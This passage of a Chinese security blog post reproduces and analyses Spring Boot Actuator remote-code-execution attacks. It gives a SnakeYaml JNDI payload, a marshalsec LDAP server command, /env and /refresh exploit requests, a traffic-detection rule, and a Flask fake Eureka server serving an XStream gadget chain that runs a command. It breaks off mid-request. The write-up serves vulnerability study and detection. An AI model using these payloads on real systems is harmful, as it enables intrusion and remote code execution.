+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">multicastEvent</span><span class="o">(</span><span class="kd">final</span> <span class="n">ApplicationEvent</span> <span class="n">event</span><span class="o">,</span> <span class="n">ResolvableType</span> <span class="n">eventType</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ResolvableType</span> <span class="n">type</span> <span class="o">=</span> <span class="n">eventType</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">eventType</span> <span class="o">:</span> <span class="k">this</span><span class="o">.</span><span class="na">resolveDefaultEventType</span><span class="o">(</span><span class="n">event</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Iterator</span> <span class="n">var4</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getApplicationListeners</span><span class="o">(</span><span class="n">event</span><span class="o">,</span> <span class="n">type</span><span class="o">).</span><span class="na">iterator</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="o">(</span><span class="n">var4</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="n">ApplicationListener</span><span class="o">&lt;?&gt;</span> <span class="n">listener</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationListener</span><span class="o">)</span><span class="n">var4</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Executor</span> <span class="n">executor</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getTaskExecutor</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">executor</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">executor</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="k">new</span> <span class="n">Runnable</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">SimpleApplicationEventMulticaster</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">invokeListener</span><span class="o">(</span><span class="n">listener</span><span class="o">,</span> <span class="n">event</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">});</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="o">.</span><span class="na">invokeListener</span><span class="o">(</span><span class="n">listener</span><span class="o">,</span> <span class="n">event</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到其逻辑如下：</p>
+<ul>
+<li>根据事件类型获取到可以处理此事件的事件监听器；</li>
+<li>异步或者同步地方式调用事件监听器；</li>
+</ul>
+<p>例如如下所示，遍历到当前事件的一个事件监听器，然后触发执行它：</p>
+<p><img src="/media/image-20210819162134752.png" alt="image-20210819162134752"></p>
+<p>在 <code>ConfigFileApplicationListener#onApplicationEvent(ApplicationEvent event)</code> 打一个端点，就能看到收到事件通知了：</p>
+<p><img src="/media/image-20210819162332595.png" alt="image-20210819162332595"></p>
+<h2 id="snakeyaml-rce">SnakeYaml RCE</h2>
+<h3 id="攻击复现">攻击复现</h3>
+<p>首先在VPS上准备一个yml文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">foo</span><span class="p">:</span><span class="w"> </span><span class="cp">!!com.sun.rowset.JdbcRowSetImpl</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">dataSourceName</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;ldap://localhost:1099/EvalClass&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">autoCommit</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后用marshalsec起一个恶意的Ldap服务：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/#EvalClass <span class="m">1099</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再准备一个恶意的class文件：</p>
+<p><img src="/media/image-20210819164649769.png" alt="image-20210819164649769"></p>
+<p>最后起一个HTTP服务（class文件和shell.yml需要在这个HTTP服务下）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">python3 -m http.server <span class="m">80</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>现在开始准备攻击，首先发送如下数据包：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/monitor/env</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1:8090</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">OFBiz.Visitor=10000</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">none</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Pragma</span><span class="o">:</span> <span class="l">no-cache</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">58</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">spring.cloud.bootstrap.location=http://127.0.0.1/shell.yml
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后发送如下数据包：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/monitor/refresh</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1:8090</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">OFBiz.Visitor=10000</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">none</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Pragma</span><span class="o">:</span> <span class="l">no-cache</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">22</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击成功：</p>
+<p><img src="/media/image-20210819165011970.png" alt="image-20210819165011970"></p>
+<h3 id="漏洞原理">漏洞原理</h3>
+<p>原理很简单：</p>
+<ol>
+<li>通过POST请求 <code>/env</code> 接口，请求添加配置： <code>spring.cloud.bootstrap.location=http://127.0.0.1/shell.yml</code> ;</li>
+<li>通过POST请求 <code>/refresh</code> 接口，请求刷新配置并重新加载配置；</li>
+<li>Spring后台使用SnakeYaml加载yml文件，导致yml反序列化RCE；</li>
+</ol>
+<p>前面已经分析过添加配置的具体流程了（ <code>EnvironmentManagerMvcEndpoint</code> ），那我请求 <code>/refresh</code> 是如何触发解析远程yml的呢？</p>
+<p>根据前面的前置知识，我们可以知道， <code>/refresh</code> 接口的具体处理逻辑应该在 <code>RefreshEndpoint</code> 内：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@ConfigurationProperties</span><span class="o">(</span><span class="n">prefix</span> <span class="o">=</span> <span class="s">&#34;endpoints.refresh&#34;</span><span class="o">,</span> <span class="n">ignoreUnknownFields</span> <span class="o">=</span> <span class="kc">false</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@ManagedResource</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">RefreshEndpoint</span> <span class="kd">extends</span> <span class="n">AbstractEndpoint</span><span class="o">&lt;</span><span class="n">Collection</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;&gt;</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="kd">private</span> <span class="n">ContextRefresher</span> <span class="n">contextRefresher</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="kd">public</span> <span class="nf">RefreshEndpoint</span><span class="o">(</span><span class="n">ContextRefresher</span> <span class="n">contextRefresher</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">super</span><span class="o">(</span><span class="s">&#34;refresh&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="o">.</span><span class="na">contextRefresher</span> <span class="o">=</span> <span class="n">contextRefresher</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">   <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="nd">@ManagedOperation</span>
+</span></span><span class="line"><span class="cl">   <span class="kd">public</span> <span class="n">String</span><span class="o">[]</span> <span class="nf">refresh</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">Set</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">keys</span> <span class="o">=</span> <span class="n">contextRefresher</span><span class="o">.</span><span class="na">refresh</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">keys</span><span class="o">.</span><span class="na">toArray</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[</span><span class="n">keys</span><span class="o">.</span><span class="na">size</span><span class="o">()]);</span>
+</span></span><span class="line"><span class="cl">   <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">   <span class="kd">public</span> <span class="n">Collection</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="nf">invoke</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="n">refresh</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">   <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>入口在 <code>refresh()</code> 方法，一路跟进 <code>contextRefresher.refresh()</code> ，直到 <code>org.springframework.cloud.context.refresh.ContextRefresher#addConfigFilesToEnvironment()</code> ：</p>
+<p><img src="/media/image-20210819170601176.png" alt="image-20210819170601176"></p>
+<p>所以接下来我们直接跟进 <code>BootstrapApplicationListener</code> 和  <code>ConfigFileApplicationListener</code> 即可。首先看到 <code>BootstrapApplicationListener</code> 的事件处理：</p>
+<p><img src="/media/image-20210819171547783.png" alt="image-20210819171547783"></p>
+<p>这个地方会通过 <code>SpringApplicationBuilder</code> 再次发布事件，且事件的 <code>StandardEnvironment</code> 内，将存在一个name为 <code>BOOTSTRAP_PROPERTY_SOURCE_NAME</code> （bootstrap）的 <code>MapPropertySource</code> ，这个 <code>MapPropertySource</code> 对象内存储了两个键值对：</p>
+<p><img src="/media/image-20210819171932154.png" alt="image-20210819171932154"></p>
+<p>我们再跟进到另外一个事件监听器 <code>ConfigFileApplicationListener</code>：</p>
+<p><img src="/media/image-20210819172245653.png" alt="image-20210819172245653"></p>
+<p>发现已经接收到事件了，并且其事件的environment属性中存在名字为bootstrap的MapPropertySource，且其内的数据和前面发布事件时设置的一样。</p>
+<p>接下里就是一系列的环境属性的解析了，直接跟到 <code>org.springframework.boot.context.config.ConfigFileApplicationListener#getSearchLocations()</code> ：</p>
+<p><img src="/media/image-20210819173031752.png" alt="image-20210819173031752"></p>
+<p>然后就会在 <code>org.springframework.boot.context.config.ConfigFileApplicationListener#load()</code> 中准备进行远程yml解析：</p>
+<p><img src="/media/image-20210819173235688.png" alt="image-20210819173235688"></p>
+<p>一系列流程就不跟了，直接看到底层触发SnakeYaml反序列化的位置：</p>
+<p><img src="/media/image-20210819173517166.png" alt="image-20210819173517166"></p>
+<h3 id="流量特征">流量特征</h3>
+<p>特征为POST请求设置环境变量，所以规则为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">METHOD = POST
+</span></span><span class="line"><span class="cl">URI    = /env
+</span></span><span class="line"><span class="cl">REG    = spring\.cloud\.bootstrap\.location=https?:\S*\.ya?ml
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="eureka-xstream-rce">Eureka Xstream RCE</h2>
+<h3 id="攻击复现-1">攻击复现</h3>
+<p>首先准备一个Fake Eureka Server：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">Response</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">defaults</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;path&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&lt;path:path&gt;&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">catch_all</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xml</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;&lt;linked-hash-set&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;jdk.nashorn.internal.objects.NativeString&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;value class=&#34;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;dataHandler&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;dataSource class=&#34;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">          &lt;is class=&#34;javax.crypto.CipherInputStream&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;cipher class=&#34;javax.crypto.NullCipher&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">              &lt;serviceIterator class=&#34;javax.imageio.spi.FilterIterator&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;iter class=&#34;javax.imageio.spi.FilterIterator&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                  &lt;iter class=&#34;java.util.Collections$EmptyIterator&#34;/&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                  &lt;next class=&#34;java.lang.ProcessBuilder&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;command&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                       &lt;string&gt;calc&lt;/string&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;/command&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                  &lt;/next&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;/iter&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;filter class=&#34;javax.imageio.ImageIO$ContainsFilter&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                  &lt;method&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;name&gt;start&lt;/name&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    &lt;parameter-types/&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                  &lt;/method&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                  &lt;name&gt;foo&lt;/name&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;/filter&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                &lt;next class=&#34;string&#34;&gt;foo&lt;/next&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">              &lt;/serviceIterator&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">              &lt;lock/&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;/cipher&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;input class=&#34;java.lang.ProcessBuilder$NullInputStream&#34;/&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;ibuffer&gt;&lt;/ibuffer&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">          &lt;/is&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;/dataSource&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;/dataHandler&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/value&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/linked-hash-set&gt;&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">xml</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="s1">&#39;application/xml&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后POST请求 <code>/env</code> 接口，请求设置环境变量：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/monitor/env</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1:8090</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">OFBiz.Visitor=10000</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">none</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Pragma</span><span class="o">:</span> <span class="l">no-cache</span>
